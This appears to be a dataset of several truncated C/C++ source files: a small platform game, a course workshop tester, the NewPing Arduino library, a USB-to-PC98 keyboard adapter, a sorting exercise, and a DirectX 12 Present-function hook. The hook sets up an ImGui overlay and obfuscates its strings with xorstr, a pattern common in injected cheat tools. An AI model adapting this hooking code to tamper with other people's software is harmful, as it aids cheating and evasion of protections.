5);\r\n\t\tpieslice(x + 40, y, 270, 90, 5);\r\n\r\n\t\tif (type == MOVING) {\r\n\t\t\tif (x >= 450 || x <= 50) {\r\n\t\t\t\tvelX *= -1;\r\n\t\t\t}\r\n\t\t\tx += velX;\r\n\t\t}\r\n\t\tif (moveY)\r\n\t\t\ty -= velY;\r\n\r\n\t\t//draw new\r\n\t\tsetcolor(WHITE);\r\n\t\tsetfillstyle(SOLID_FILL, WHITE);\r\n\t\tbar(x - 40, y + 5, x + 40, y - 5);\r\n\t\tpieslice(x - 40, y, 90, 270, 5);\r\n\t\tpieslice(x + 40, y, 270, 90, 5);\r\n\t}\r\n\r\n\r\n};\r\n//end structure definitions\r\n\r\n\r\n\r\n//Function prototypes\r\nvoid welcomeScreen();\r\nvoid drawHoop(int, int);\r\nvoid initPlatform(Platform&, double, double, int);\r\nvoid bounceball(Landed, Player&, Platform&);\r\nvoid drawPlatform(double, double);\r\nvoid displayScore(int, int, int);\r\nvoid setCosmos(int[], int[]);\r\nvoid drawCosmos(int [], int[]);\r\n\r\nint main()\r\n{\r\n\tbool keepGoing = true;\r\n\tbool movingPlatforms = false;\r\n\tdouble platformVel = 0;\r\n\tchar keyPressed;\r\n\tint score = 0;\r\n\tint xArray[500];\r\n\tint yArray[500];\r\n\r\n\r\n\r\n\tinitwindow(500, 800, (char*)\"Cosmic Climb\", 10, 10);\r\n\r\n  \tsetCosmos(xAr",
    "// Workshop 4 - Containers\n\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include <string>\n#include <utility>\n#include \"Restaurant.h\"\n#include \"Restaurant.h\" // intentional\n#include \"ConfirmationSender.h\"\n#include \"ConfirmationSender.h\" // intentional\n#include \"Reservation.h\"\n#include \"Reservation.h\" // intentional\n\nint cout = 0; // won't compile if headers don't follow convention\n\nint main(int argc, char** argv)\n{\n\tstd::cout << \"Command Line:\\n\";\n\tstd::cout << \"--------------------------\\n\";\n\tfor (int i = 0; i < argc; ++i)\n\t\tstd::cout << std::setw(3) << i + 1 << \": \" << argv[i] << '\\n';\n\tstd::cout << \"--------------------------\\n\\n\";\n\n\tconst seneca::Reservation** ppReservations = nullptr;\n\tsize_t cnt = 0;\n\n\t// Process the file\n\tif (argc > 1) {\n\t\tstd::ifstream file(argv[1]);\n\t\tif (!file)\n\t\t{\n\t\t\tstd::cerr << \"ERROR: Cannot open file [\" << argv[1] << \"].\\n\";\n\t\t\treturn 1;\n\t\t}\n\n\t\tstd::string strReservation;\n\t\t// count how many records are in the file\n\t\tdo\n\t\t{\n\t\t\tstd::getline(file, strReservation);\n\n\t\t\t// if the previous operation failed, the \"file\" object is\n\t\t\t//   in error mode\n\t\t\tif (file)\n\t\t\t{\n\t\t\t\t// Check if this is a commented line.\n\t\t\t\t//   In the input file, commented lines start with '#'\n\t\t\t\tif (strReservation[0] != '#')\n\t\t\t\t\t++cnt;\n\t\t\t}\n\t\t} while (file);\n\n\t\tppReservations = new const seneca::Reservation*[cnt];\n\t\tcnt = 0;\n\n\t\t// read again from the file, but this time load and store data\n\t\tfile.clear();\n\t\tfile.seekg(std::ios::beg);\n\t\tdo\n\t\t{\n\t\t\tstd::getline(file, strReservation);\n\n\t\t\t// if the previous operation failed, the \"file\" object is\n\t\t\t//   in error mode\n\t\t\tif (file)\n\t\t\t{\n\t\t\t\t// Check if this is a commented line.\n\t\t\t\t//   In the input file, commented lines start with '#'\n\t\t\t\tif (strReservation[0] != '#')\n\t\t\t\t{\n\t\t\t\t\tppReservations[cnt] = new const seneca::Reservation(strReservation);\n\t\t\t\t\t++cnt;\n\t\t\t\t}\n\t\t\t}\n\t\t} while (file);\n\t\tfile.close();\n\t}\n\tstd::cout << \"\\nReservations\\n--------------------------\\n\";\n\tfor (auto i = 0u; i < cnt; ++i)\n\t{\n\t\tstd::cout << *ppReservations[i];\n\t}\n\tstd::cout << \"--------------------------\\n\\n\";\n\n\t{\n\t\tstd::cout << \"R: Testing Constructor\\n\";\n\t\tstd::cout << \"==========================\\n\";\n\t\tseneca::Restaurant res1(ppReservations, cnt);\n\t\tstd::cout << res1;  // 1\n\t\tstd::cout << \"==========================\\n\\n\";\n\n\t\tstd::cout << \"R: Testing Copy Constructor\\n\";\n\t\tstd::cout << \"==========================\\n\";\n\t\tseneca::Restaurant res2(res1);\n\t\tstd::cout << res1;  // 2\n\t\tstd::cout << res2;  // 3\n\t\tstd::cout << \"==========================\\n\\n\";\n\n\t\t{\n\t\t\tstd::cout << \"R: Testing Copy Assign\\n\";\n\t\t\tstd::cout << \"==========================\\n\";\n\t\t\tres2 = res2;\n\t\t\tstd::cout << res1;  // 4\n\t\t\tstd::cout << res2;  // 5\n\t\t\tseneca::Restaurant res3(ppReservations + 3, 4);\n\t\t\tres2 = res3;\n\t\t\tstd::cout << res2;  // 6\n\t\t\tstd::cout << res3;  // 7\n\t\t\tstd::cout << \"==========================\\n\\n\";\n\t\t}\n\n\t\tstd::cout << \"R: Testing Move Constructor\\n\";\n\t\tstd::cout << \"==========================\\n\";\n\t\tseneca::Restaurant res3(std::move(res2));\n\t\tstd::cout << res2;  // 8\n\t\tstd::cout << res3;  // 9\n\t\tstd::cout << \"==========================\\n\\n\";\n\n\t\tstd::cout << \"R: Testing Move Assign\\n\";\n\t\tstd::cout << \"==========================\\n\";\n\t\tauto& res3Reference = res3;\n\t\tres3 = std::move(res3Reference);\n\t\tstd::cout << res2;  // 10\n\t\tstd::cout << res3;  // 11\n\t\tres2 = std::move(res3);\n\t\tstd::cout << res2;  // 12\n\t\tstd::cout << res3;  // 13\n\t\tstd::cout << \"==========================\\n\\n\";\n\t}\n\n\n\t// Confirmation Sender\n\t{\n\t\tstd::cout << \"CS: Testing Constructor\\n\";\n\t\tstd::cout << \"==========================\\n\";\n\t\tseneca::ConfirmationSender sender1;\n\t\tstd::cout << sender1;\n\t\tstd::cout << \"==========================\\n\\n\";\n\n\t\tstd::cout << \"CS: Testing Operators\\n\";\n\t\tstd::cout << \"==========================\\n\";\n\t\tsender1 += *ppReservations[5];\n\t\tsender1 += *ppReservations[16];\n\t\tsender1 += *ppReservations[2];\n\t\tsender1 += *ppReservations[16];\n\t\tsender1 += *ppReservations[8];\n\t\tsender1 += *ppReservations[10];\n\t\tsender1 += *ppReservations[9];\n\t\tstd::cout << sender1;\n\t\tsender1 -= *ppReservations[16];\n\t\tsender1 -= *ppReservations[9];\n\t\tsender1 -= *ppReservations[7];\n\t\tstd::cout << sender1;\n\t\tstd::cout << \"==========================\\n\\n\";\n\n\t\tstd::cout << \"CS: Testing Copy Constructor\\n\";\n\t\tstd::cout << \"==========================\\n\";\n\t\tseneca::ConfirmationSender sender2(sender1);\n\t\tstd::cout << sender1;\n\t\tstd::cout << sender2;\n\t\tstd::cout << \"==========================\\n\\n\";\n\n\t\tsender2 = sender2;\n\n\t\tstd::cout << \"CS: Testing Move Constructor\\n\";\n\t\tstd::cout << \"==========================\\n\";\n\t\tseneca::ConfirmationSender sender3(std::move(sender1));\n\t\tstd::cout << sender1;\n\t\tstd::cout << sender3;\n\t\tstd::cout << \"==========================\\n\\n\";\n\n\t\tauto& sender3Reference = sender3;\n\t\tsender3 = std::move(sender3Reference);\n\t}\n\n\t{\n\t\t// Making a new array of pointers to reservation.\n\t\t//   The reservations in this array are not constant, so we must\n\t\t//   create copies of the original reservation (which are co",
    "// ---------------------------------------------------------------------------\n// Created by Tim Eckel - eckel.tim@gmail.com\n//\n// See NewPing.h for license, purpose, syntax, version history, links, etc.\n// ---------------------------------------------------------------------------\n\n#include \"NewPing.h\"\n\n\n// ---------------------------------------------------------------------------\n// NewPing constructor\n// ---------------------------------------------------------------------------\n\nNewPing::NewPing(uint8_t trigger_pin, uint8_t echo_pin, unsigned int max_cm_distance) {\n#if DO_BITWISE == true\n\t_triggerBit = digitalPinToBitMask(trigger_pin); // Get the port register bitmask for the trigger pin.\n\t_echoBit = digitalPinToBitMask(echo_pin);       // Get the port register bitmask for the echo pin.\n\n\t_triggerOutput = portOutputRegister(digitalPinToPort(trigger_pin)); // Get the output port register for the trigger pin.\n\t_echoInput = portInputRegister(digitalPinToPort(echo_pin));         // Get the input port register for the echo pin.\n\n\t_triggerMode = (uint8_t *) portModeRegister(digitalPinToPort(trigger_pin)); // Get the port mode register for the trigger pin.\n#else\n\t_triggerPin = trigger_pin;\n\t_echoPin = echo_pin;\n#endif\n\t_one_pin_mode = (trigger_pin == echo_pin); // Automatic one pin mode detection per sensor.\n\n\tset_max_distance(max_cm_distance); // Call function to set the max sensor distance.\n\n#if (defined(__arm__) && (defined(TEENSYDUINO) || defined(PARTICLE))) || defined(ARDUINO_AVR_YUN) || DO_BITWISE != true\n\tpinMode(echo_pin, INPUT);     // Set echo pin to input (on Teensy 3.x (ARM), pins default to disabled, at least one pinMode() is needed for GPIO mode).\n\tpinMode(trigger_pin, OUTPUT); // Set trigger pin to output (on Teensy 3.x (ARM), pins default to disabled, at least one pinMode() is needed for GPIO mode).\n#endif\n\n#if DO_BITWISE == true\n\t*_triggerMode |= _triggerBit;    // Set trigger pin to output.\n\t*_triggerOutput &= ~_triggerBit; // Trigger pin should already be low, but set to low to make sure.\n#else\n\tdigitalWrite(_triggerPin, LOW);  // Trigger pin should already be low, but set to low to make sure.\n#endif\n}\n\n\n// ---------------------------------------------------------------------------\n// Standard ping methods\n// ---------------------------------------------------------------------------\n\nunsigned int NewPing::ping(unsigned int max_cm_distance) {\n\tif (max_cm_distance > 0) set_max_distance(max_cm_distance); // Call function to set a new max sensor distance.\n\n\tif (!ping_trigger()) return NO_ECHO; // Trigger a ping, if it returns false, return NO_ECHO to the calling function.\n\n#if URM37_ENABLED == true\n\t#if DO_BITWISE == true\n\t\twhile (!(*_echoInput & _echoBit)) // Wait for the ping echo.\n\t#else\n\t\twhile (!digitalRead(_echoPin))    // Wait for the ping echo.\n\t#endif\n\t\t\tif (micros() > _max_time) return NO_ECHO; // Stop the loop and return NO_ECHO (false) if we're beyond the set maximum distance.\n#else\n\t#if DO_BITWISE == true\n\t\twhile (*_echoInput & _echoBit)    // Wait for the ping echo.\n\t#else\n\t\twhile (digitalRead(_echoPin))     // Wait for the ping echo.\n\t#endif\n\t\t\tif (micros() > _max_time) return NO_ECHO; // Stop the loop and return NO_ECHO (false) if we're beyond the set maximum distance.\n#endif\n\n\treturn (micros() - (_max_time - _maxEchoTime) - PING_OVERHEAD); // Calculate ping time, include overhead.\n}\n\n\nunsigned long NewPing::ping_cm(unsigned int max_cm_distance) {\n\tunsigned long echoTime = NewPing::ping(max_cm_distance); // Calls the ping method and returns with the ping echo distance in uS.\n#if ROUNDING_ENABLED == false\n\treturn (echoTime / US_ROUNDTRIP_CM);              // Call the ping method and returns the distance in centimeters (no rounding).\n#else\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_CM); // Convert uS to centimeters.\n#endif\n}\n\n\nunsigned long NewPing::ping_in(unsigned int max_cm_distance) {\n\tunsigned long echoTime = NewPing::ping(max_cm_distance); // Calls the ping method and returns with the ping echo distance in uS.\n#if ROUNDING_ENABLED == false\n\treturn (echoTime / US_ROUNDTRIP_IN);              // Call the ping method and returns the distance in inches (no rounding).\n#else\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_IN); // Convert uS to inches.\n#endif\n}\n\n\nunsigned long NewPing::ping_median(uint8_t it, unsigned int max_cm_distance) {\n\tunsigned int uS[it], last;\n\tuint8_t j, i = 0;\n\tunsigned long t;\n\tuS[0] = NO_ECHO;\n\n\tif (max_cm_distance > 0) set_max_distance(max_cm_distance); // Call function to set a new max sensor distance.\n\n\twhile (i < it) {\n\t\tt = micros();          // Start ping timestamp.\n\t\tlast = ping();         // Send ping.\n\n\t\tif (last != NO_ECHO) { // Ping in range, include as part of median.\n\t\t\tif (i > 0) {       // Don't start sort till second ping.\n\t\t\t\tfor (j = i; j > 0 && uS[j - 1] < last; j--) // Insertion sort loop.\n\t\t\t\t\tuS[j] = uS[j - 1];                      // Shift ping array to correct position for sort insertion.\n\t\t\t} else j = 0;      // First ping is s",
    "#include \"DX12Hook.h\"\n\n#include \"HookManager.h\"\n#include \"Utils.h\"\n\ntypedef HRESULT(APIENTRY* IDXGISwapChainPresent)(IDXGISwapChain3* pSwapChain, UINT SyncInterval, UINT Flags);\ntypedef void(APIENTRY* DrawInstanced)(ID3D12GraphicsCommandList* dCommandList, UINT VertexCountPerInstance, UINT InstanceCount, UINT StartVertexLocation, UINT StartInstanceLocation);\ntypedef void(APIENTRY* DrawIndexedInstanced)(ID3D12GraphicsCommandList* dCommandList, UINT IndexCountPerInstance, UINT InstanceCount, UINT StartIndexLocation, INT BaseVertexLocation, UINT StartInstanceLocation);\ntypedef void(APIENTRY* ExecuteCommandLists)(ID3D12CommandQueue* queue, UINT NumCommandLists, ID3D12CommandList* ppCommandLists);\n\nnamespace Backend\n{\n\tstruct DirectX12MainFunctions {\n\t\tIDXGISwapChainPresent presentFunc;\n\t\tDrawInstanced drawInstancedFunc;\n\t\tDrawIndexedInstanced drawIndexedInstancedFunc;\n\t\tExecuteCommandLists executeCommandListFunc;\n\t};\n\n\tnamespace DirectX12Interface {\n\t\tID3D12Device* Device = nullptr;\n\t\tID3D12DescriptorHeap* DescriptorHeapBackBuffers;\n\t\tID3D12DescriptorHeap* DescriptorHeapImGuiRender;\n\t\tID3D12GraphicsCommandList* CommandList;\n\t\tID3D12CommandQueue* CommandQueue;\n\n\t\tstruct _FrameContext {\n\t\t\tID3D12CommandAllocator* CommandAllocator;\n\t\t\tID3D12Resource* Resource;\n\t\t\tD3D12_CPU_DESCRIPTOR_HANDLE DescriptorHandle;\n\t\t};\n\n\t\tUINT BuffersCounts = -1;\n\t\t_FrameContext* FrameContext;\n\t}\n\t\n\tDX12Hook* DX12Hook::m_instance = nullptr;\n\tWNDCLASSEX windowClass;\n\tHWND windowHwnd;\n\n\tDX12Hook::DX12Hook()\n\t{\n\t\tm_instance = this;\n\t}\n\n\tDX12Hook::~DX12Hook()\n\t{\n\t\tm_instance = nullptr;\n\t}\n\n\tDX12Hook* DX12Hook::GetInstance()\n\t{\n\t\tif (!m_instance)\n\t\t\tm_instance = new DX12Hook();\n\t\treturn m_instance;\n\t}\n\n\tHRESULT __stdcall DX12Hook::PresentHook(IDXGISwapChain3* pSwapChain, UINT syncInterval, UINT flags)\n\t{\n\t\tif (!m_instance) return E_UNEXPECTED;\n\t\t\n\t\tstatic bool init = false;\n\t\tif (!init && m_instance->OnInit)\n\t\t{\n\t\t\tconst auto result = (HRESULT)pSwapChain->GetDevice(__uuidof(DirectX12Interface::Device), reinterpret_cast<void**>(&DirectX12Interface::Device));\n\t\t\tLOG(xorstr(\"Result of GetDevice: %x\"), HRESULT_CODE(result));\n\t\t\tif (SUCCEEDED(result))\n\t\t\t{\n\t\t\t\tDXGI_SWAP_CHAIN_DESC desc;\n\t\t\t\tpSwapChain->GetDesc(&desc);\n\t\t\t\tdesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\n\t\t\t\tdesc.Windowed = (GetWindowLongPtr(desc.OutputWindow, GWL_STYLE) & WS_POPUP) == 0;\n\n\t\t\t\tDirectX12Interface::BuffersCounts = desc.BufferCount;\n\t\t\t\tDirectX12Interface::FrameContext = new DirectX12Interface::_FrameContext[DirectX12Interface::BuffersCounts];\n\n\t\t\t\tD3D12_DESCRIPTOR_HEAP_DESC descriptorImGuiRender = {};\n\t\t\t\tdescriptorImGuiRender.Type = D3D12_DESCRIPTOR_HEAP_TYPE_CBV_SRV_UAV;\n\t\t\t\tdescriptorImGuiRender.NumDescriptors = DirectX12Interface::BuffersCounts;\n\t\t\t\tdescriptorImGuiRender.Flags = D3D12_DESCRIPTOR_HEAP_FLAG_SHADER_VISIBLE;\n\n\t\t\t\tif (DirectX12Interface::Device->CreateDescriptorHeap(&descriptorImGuiRender, IID_PPV_ARGS(&DirectX12Interface::DescriptorHeapImGuiRender)) != S_OK)\n\t\t\t\t\treturn CALL_ORIGIN(PresentHook, pSwapChain, syncInterval, flags);\n\n\t\t\t\tID3D12CommandAllocator* allocator;\n\t\t\t\tif (DirectX12Interface::Device->CreateCommandAllocator(D3D12_COMMAND_LIST_TYPE_DIRECT, IID_PPV_ARGS(&allocator)) != S_OK)\n\t\t\t\t\treturn CALL_ORIGIN(PresentHook, pSwapChain, syncInterval, flags);\n\n\t\t\t\tfor (size_t i = 0; i < DirectX12Interface::BuffersCounts; i++)\n\t\t\t\t\tDirectX12Interface::FrameContext[i].CommandAllocator = allocator;\n\n\t\t\t\tif (DirectX12Interface::Device->CreateCommandList(0, D3D12_COMMAND_LIST_TYPE_DIRECT, allocator, NULL, IID_PPV_ARGS(&DirectX12Interface::CommandList)) != S_OK ||\n\t\t\t\t\tDirectX12Interface::CommandList->Close() != S_OK)\n\t\t\t\t\treturn CALL_ORIGIN(PresentHook, pSwapChain, syncInterval, flags);\n\n\t\t\t\tD3D12_DESCRIPTOR_HEAP_DESC descriptorBackBuffers;\n\t\t\t\tdescriptorBackBuffers.Type = D3D12_DESCRIPTOR_HEAP_TYPE_RTV;\n\t\t\t\tdescriptorBackBuffers.NumDescriptors = DirectX12Interface::BuffersCounts;\n\t\t\t\tdescriptorBackBuffers.Flags = D3D12_DESCRIPTOR_HEAP_FLAG_NONE;\n\t\t\t\tdescriptorBackBuffers.NodeMask = 1;\n\n\t\t\t\tif (DirectX12Interface::Device->CreateDescriptorHeap(&descriptorBackBuffers, IID_PPV_ARGS(&DirectX12Interface::DescriptorHeapBackBuffers)) != S_OK)\n\t\t\t\t\treturn CALL_ORIGIN(PresentHook, pSwapChain, syncInterval, flags);\n\n\t\t\t\tconst auto rtvDescriptorSize = DirectX12Interface::Device->GetDescriptorHandleIncrementSize(D3D12_DESCRIPTOR_HEAP_TYPE_RTV);\n\t\t\t\tD3D12_CPU_DESCRIPTOR_HANDLE rtvHandle = DirectX12Interface::DescriptorHeapBackBuffers->GetCPUDescriptorHandleForHeapStart();\n\n\t\t\t\tfor (uint32_t i = 0; i < DirectX12Interface::BuffersCounts; i++)\n\t\t\t\t{\n\t\t\t\t\tID3D12Resource* pBackBuffer = nullptr;\n\t\t\t\t\tDirectX12Interface::FrameContext[i].DescriptorHandle = rtvHandle;\n\t\t\t\t\tpSwapChain->GetBuffer(i, IID_PPV_ARGS(&pBackBuffer));\n\t\t\t\t\tDirectX12Interface::Device->CreateRenderTargetView(pBackBuffer, nullptr, rtvHandle);\n\t\t\t\t\tDirectX12Interface::FrameContext[i].Resource = pBackBuffer;\n\t\t\t\t\trtvHandle.ptr += rtvDescriptorSize;\n\t\t\t\t}\n\n\t\t\t\tm_instance->OnInit(desc.OutputWindow, Dire",
    "//---------------------------------------------------------------------\r\n// USB/Keyboard(Japanese) to PC98 Keyboard\r\n// \r\n// (Arduino Pro Mini 8MHz)\r\n// \u30fbUSB_Host_Shield_2.0 (https://github.com/felis/USB_Host_Shield_2.0)\r\n// \u30fbMsTimer2 (http://playground.arduino.cc/Main/MsTimer2)\r\n//\r\n// minidin8P   --  Arduino Pro Mini\r\n//  1 RST      --  1(D1)\r\n//  2 GND      --  GND\r\n//  3 RDY      --  \r\n//  4 RxD      --  2(D0)\r\n//  5 RTY      --  \r\n//  6          --  \r\n//  7          --  \r\n//  8 Vcc(+5V) --  Vcc(+5V)\r\n//\r\n// minidin9P   --  Arduino Pro Mini\r\n//  1 Vcc(+5V) --  \r\n//  2 XA       --  6(D3)\r\n//  3 XB       --  7(D4)\r\n//  4 YA       --  8(D5)\r\n//  5 YB       --  9(D6)\r\n//  6 L        --  10(D7)\r\n//  7 M        --  \r\n//  8 R        --  11(D8)\r\n//  9 GND      --  \r\n//---------------------------------------------------------------------\r\n#include <hidboot.h>\r\n#include <usbhub.h>\r\n#include <MsTimer2.h>\r\n#include \"keymap.h\"\r\n\r\n// DEBUG\r\n#define DEBUG       0     // 0:\u30c7\u30d0\u30c3\u30b0\u60c5\u5831\u51fa\u529b\u306a\u3057 1:\u30c7\u30d0\u30c3\u30b0\u60c5\u5831\u51fa\u529b\u3042\u308a\r\n#define LOBYTE(x) ((char*)(&(x)))[0]\r\n#define HIBYTE(x) ((char*)(&(x)))[1]\r\n\r\n// GPIO\r\n#define MS_XA       3     // Mouse XA\r\n#define MS_XB       4     // Mouse XB\r\n#define MS_YA       5     // Mouse YA\r\n#define MS_YB       6     // Mouse YB\r\n#define MS_LB       7     // Mouse LB\r\n#define MS_RB       8     // Mouse RB\r\n#define LED        13     // \u5185\u8535LED\r\n\r\n// \u5909\u6570\r\nvolatile uint8_t sCode = 0xff;          // \u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9\r\nvolatile uint8_t prevScode = 0xff;      // \u524d\u56de\u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9\r\nvolatile int16_t sCodeCnt = 0;          // \u30ad\u30fc\u30ea\u30d4\u30fc\u30c8\u56de\u6570\r\nvolatile int16_t delayTime = 500;       // \u30ad\u30fc\u30ea\u30d4\u30fc\u30c8\u958b\u59cb(\u521d\u671f\u5024500ms)\r\nvolatile int16_t repeatTime = 110;      // \u30ad\u30fc\u30ea\u30d4\u30fc\u30c8\u9593\u9694(\u521d\u671f\u5024110ms)\r\n\r\nvolatile int16_t XYlimit = 256;         // \u30de\u30a6\u30b9\u30ea\u30df\u30c3\u30c8\u5024\r\nvolatile int16_t xState = 0;            // \u30de\u30a6\u30b9\u30b9\u30c6\u30fc\u30bf\u30b9(X)\r\nvolatile int16_t ySstate = 0;           // \u30de\u30a6\u30b9\u30b9\u30c6\u30fc\u30bf\u30b9(Y)\r\nvolatile int16_t bSstate = 0;           // \u30de\u30a6\u30b9\u30b9\u30c6\u30fc\u30bf\u30b9(B)\r\n\r\nvoid sendRepeat();\r\n//\r\n// HID\u30ad\u30fc\u30dc\u30fc\u30c9 \u30ec\u30dd\u30fc\u30c8\u30d1\u30fc\u30b5\u30fc\u30af\u30e9\u30b9\u306e\u5b9a\u7fa9\r\n//\r\nclass KbdRptParser : public KeyboardReportParser {\r\n  protected:\r\n    void OnControlKeysChanged(uint8_t before, uint8_t after);\r\n    void OnKeyDown(uint8_t mod, uint8_t key);\r\n    void OnKeyUp(uint8_t mod, uint8_t key);\r\n    void OnKeyPressed(uint8_t key) {};\r\n};\r\n\r\n//\r\n// HID\u30de\u30a6\u30b9 \u30ec\u30dd\u30fc\u30c8\u30d1\u30fc\u30b5\u30fc\u30af\u30e9\u30b9\u306e\u5b9a\u7fa9\r\n//\r\nclass MseRptParser : public MouseReportParser {\r\n  protected:\r\n    void OnMouseMove(MOUSEINFO *mi);\r\n    void OnLeftButtonUp(MOUSEINFO *mi);\r\n    void OnLeftButtonDown(MOUSEINFO *mi);\r\n    void OnRightButtonUp(MOUSEINFO *mi);\r\n    void OnRightButtonDown(MOUSEINFO *mi);\r\n};\r\n\r\n//\r\n// PC98 make\u30b3\u30fc\u30c9\u9001\u4fe1(\u30ad\u30fc\u62bc\u3057)\r\n// \u5f15\u6570 key(IN) HID Usage ID\r\n//\r\nvoid sendKeyMake(uint8_t key) {\r\n  // HID Usage ID \u304b\u3089 PC98 \u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9 \u306b\u5909\u63db\r\n  uint8_t code = 0;\r\n  code = pgm_read_byte(&(keytable98[key]));\r\n  if (code == 0xff) {\r\n    return;\r\n  }\r\n  sCodeCnt++;\r\n  prevScode = code;\r\n#if DEBUG\r\n  Serial.print(F(\"UP2[\"));  Serial.print(F(\"key=\"));  Serial.print(key, HEX);\r\n  Serial.print(F(\" code=\"));  Serial.print(code, HEX);  Serial.println(F(\"]\"));\r\n#endif\r\n  // PC98\u30ad\u30fc\u306e\u767a\u884c\r\n  Serial.write(code);\r\n  sCode = code;\r\n  MsTimer2::set(delayTime, sendRepeat);\r\n  MsTimer2::start();\r\n}\r\n\r\n//\r\n// PC98 break\u30b3\u30fc\u30c9\u9001\u4fe1(\u30ad\u30fc\u96e2\u3057)\r\n// \u5f15\u6570 key(IN) HID Usage ID\r\n//\r\nvoid sendKeyBreak(uint8_t key) {\r\n  // HID Usage ID \u304b\u3089 PC98 \u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9 \u306b\u5909\u63db\r\n  uint8_t code = 0;\r\n  code = pgm_read_byte(&(keytable98[key]));\r\n  if (code == 0xff) {\r\n    return;\r\n  }\r\n  sCodeCnt--;\r\n  if (prevScode == code) {\r\n    sCode = 0xff;\r\n  }\r\n#if DEBUG\r\n  Serial.print(F(\"DN [\"));  Serial.print(F(\"key=\"));  Serial.print(key, HEX);\r\n  Serial.print(F(\" code=\"));  Serial.print(code, HEX);  Serial.println(F(\"]\"));\r\n#endif\r\n  // PC98\u30ad\u30fc\u306e\u767a\u884c\u30ad\u30fc\u306e\u767a\u884c\r\n  Serial.write(code | 0x80);\r\n  if (sCodeCnt == 0) {\r\n    MsTimer2::stop();\r\n  }\r\n}\r\n\r\n//\r\n// \u30a2\u30c3\u30d7\u30c7\u30fc\u30c8\u30de\u30a6\u30b9\u30dc\u30bf\u30f3\r\n//\r\nvoid updateMouseBtn() {\r\n#ifdef DEBUG_MOUSE\r\n  Serial.print(\"bSstate = \");\r\n  Serial.println(bSstate,HEX);\r\n#endif\r\n  // \u30dc\u30bf\u30f3\u306e\u5224\u5b9a\r\n  switch (bSstate) {\r\n    case 0x00:\r\n      pinMode(MS_LB, INPUT);\r\n      pinMode(MS_RB, INPUT);\r\n      break;\r\n    case 0x01:\r\n      pinMode(MS_LB, OUTPUT);\r\n      pinMode(MS_RB, INPUT);\r\n      break;\r\n    case 0x02:\r\n      pinMode(MS_LB, INPUT);\r\n      pinMode(MS_RB, OUTPUT);\r\n      break;\r\n    case 0x03:\r\n      pinMode(MS_LB, OUTPUT);\r\n      pinMode(MS_RB, OUTPUT);\r\n      break;\r\n  }\r\n}\r\n\r\n//\r\n// \u30a2\u30c3\u30d7\u30c7\u30fc\u30c8\u30de\u30a6\u30b9X\r\n//\r\nvoid updateMouseX(bool di) {\r\n#ifdef DEBUG_MOUSE\r\n  Serial.print(\"xState = \");\r\n  Serial.println(xState,HEX);\r\n#endif\r\n  if (di) {\r\n    //+\u65b9\u5411(\u53f3\u65b9\u5411) 0->1->3->2\r\n    if (xState == 0) {\r\n      xState = 1;\r\n      pinMode(MS_XA, OUTPUT);\r\n      pinMode(MS_XB, INPUT);\r\n    } else if (xState == 1) {\r\n      xState = 3;\r\n      pinMode(MS_XA, OUTPUT);\r\n      pinMode(MS_XB, OUTPUT);\r\n    } else if (xState == 3) {\r\n      xState = 2;\r\n      pinMode(MS_XA, INPUT);\r\n      pinMode(MS_XB, OUTPUT);\r\n    } else if (xState == 2) {\r\n      xState = 0;\r\n      pinMode(MS_XA, INPUT);\r\n      pinMode(MS_XB, INPUT);\r\n    } else {\r\n      xState = 0;\r\n    }\r\n  } else {\r\n    //-\u65b9\u5411(\u5de6\u65b9\u5411) 2->3->1->0\r\n    if (xState == 2) {\r\n      xState = 3;\r\n      pinMode(MS_XA, OU",
    "#include <iostream> \n\nvoid InputFromUser(double array[], int array_size);\nvoid PrintArray(const std::string prompt, double array[], int array_size);\nvoid BubbleSort (double array[], const int array_size);\nvoid MergeSort(double array[], int begin_array, int end_array);\nvoid MergeArray(double array[], const int begin_array, const int mid, const int end_array);\nvoid HeapSort(double array[], int array_size);\nvoid Heapify(double array[], int array_size, int index);\n\n\nint main() {\n    const int ARRAY_SIZE = 15;\n    double numbers[ARRAY_SIZE];\n\n    InputFromUser(numbers, ARRAY_SIZE);\n\n    BubbleSort(numbers, ARRAY_SIZE);\n    PrintArray(\"Bubble sort: \", numbers, ARRAY_SIZE);\n\n    MergeSort(numbers, 0, ARRAY_SIZE-1);\n    PrintArray(\"Merge sort: \", numbers, ARRAY_SIZE);\n\n    HeapSort(numbers, ARRAY_SIZE);\n    PrintArray(\"Heap sort: \", numbers, ARRAY_SIZE);\n    \n    return 0;\n}\n\nvoid InputFromUser(double array[], int array_size) {\n    std::cout << \"Input \" << array_size << \" float numbers:\" << std::endl;\n    for (int i = 0; i < array_size; ++i) {\n        std::cin >> array[i];\n        if (std::cin.fail()) {\n            std::cin.clear();\n            std::cin.ignore(100, '\\n');\n            std::cout << \"Invalid input. Please enter a valid number.\" << std::endl;\n            --i; \n            continue;\n        }\n    }\n}\n\nvoid PrintArray(const std::string prompt, double array[], int array_size) {\n    std::cout << prompt;\n    bool space = true;\n    for (int i = 0; i < array_size; ++i) {\n        if (!space) {\n            std:: cout << \" \";\n        }\n            std::cout << array[i];\n            space = false;\n    }\n    std::cout <<std::endl;\n\n}\n    \nvoid BubbleSort (double array[], const int array_size) {\n    for (int i = 0; i < array_size - 1; ++i) {\n        for (int j = i; j < array_size; ++j) {\n            if (array[i] < array[j]) {\n                double temp = array[i];\n                array[i] = array[j];\n                 array[j] = temp;\n            }\n        }\n    }\n}\n\nvoid MergeSort(double array[], int begin_array, int end_array) {\n    if (begin_array >= end_array) return;\n\n    int mid = begin_array + (end_array - begin_array) / 2;\n    MergeSort(array, begin_array, mid);\n    MergeSort(array, mid + 1, end_array);\n    MergeArray(array, begin_array, mid, end_array);\n}\n\nvoid MergeArray(double array[], const int begin_array, const int mid, const int end_array) {\n    const int first_array_size = mid - begin_array + 1;\n    const int second_array_size = end_array - mid;\n\n    double *first_array = new double[first_array_size];\n    double *second_array = new double[second_array_size];\n\n    for (int i = 0; i < first_array_size; ++i) {\n        first_array[i] = array[begin_array + i];\n    }\n\n    for (int i = 0; i < second_array_size; ++i) {\n        second_array[i] = array[mid + i + 1];\n    }\n\n    int first_array_index = 0;\n    int second_array_index = 0;\n    int merged_array_index = begin_array;\n\n    while (first_array_index < first_array_size && second_array_index < 